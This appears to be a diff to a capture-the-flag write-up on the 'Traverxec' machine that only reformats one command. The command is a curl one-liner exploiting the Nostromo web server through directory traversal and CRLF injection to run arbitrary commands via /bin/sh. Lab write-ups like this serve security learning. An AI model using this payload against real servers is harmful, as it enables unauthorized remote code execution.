@@ -274,7 +274,10 @@ stty rows 20 columns 20
 *After some brief testing, and* ***for the sake of simplicity,*** we **re-wrote the the exploit** for Nostromo as a `curl` one-liner:
 
 ```bash
-curl -s -X $'POST' -H $'Content-Length: 1' --data-binary $'\x0d\x0aecho\x0d\x0aecho\x0d\x0a<COMMAND>' $'http://<HOSTNAME>:<PORT>/.%0d./.%0d./.%0d./.%0d./bin/sh' >/dev/null
+curl -s -X $'POST' \
+-H $'Content-Length: 1' \
+--data-binary $'\x0d\x0aecho\x0d\x0aecho\x0d\x0a<COMMAND>' \
+$'http://<HOSTNAME>:<PORT>/.%0d./.%0d./.%0d./.%0d./bin/sh' >/dev/null
 ```
 
 ![](/assets/Traverxec/exploit-rewritten.jpg)
